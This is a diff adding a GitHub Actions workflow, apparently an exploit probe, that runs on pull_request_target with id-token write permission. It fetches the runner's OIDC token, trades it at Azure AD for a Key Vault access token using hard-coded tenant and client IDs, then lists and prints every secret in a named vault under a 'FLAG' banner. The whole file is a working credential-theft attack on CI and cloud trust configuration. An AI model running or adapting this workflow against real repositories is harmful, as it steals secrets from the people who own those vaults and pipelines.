@@ -1,0 +1,42 @@
+name: prt-oidc
+on: pull_request_target
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract OIDC directly - no checkout needed
+        run: |
+          echo "=== PULL_REQUEST_TARGET OIDC ==="
+          echo "Event: $GITHUB_EVENT_NAME"
+          echo "Repo: $GITHUB_REPOSITORY"
+          echo "OIDC URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:+SET}"
+          echo "OIDC Token: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+SET}"
+          
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
+            echo "OIDC len: ${#OIDC}"
+            echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{sub,repository}'
+            
+            RESP=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+              -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+              -d "grant_type=client_credentials" \
+              -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              -d "client_assertion=${OIDC}" \
+              -d "scope=https://vault.azure.net/.default")
+            echo "Azure: $RESP"
+            
+            TOK=$(echo "$RESP" | jq -r '.access_token // empty')
+            if [ -n "$TOK" ]; then
+              echo "=== FLAG ==="
+              for ID in $(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+                -H "Authorization: Bearer $TOK" | jq -r '.value[]?.id'); do
+                curl -sS "$ID?api-version=7.4" -H "Authorization: Bearer $TOK" | jq -r '.value // .'
+              done
+            fi
+          else
+            echo "No OIDC available"
+          fi
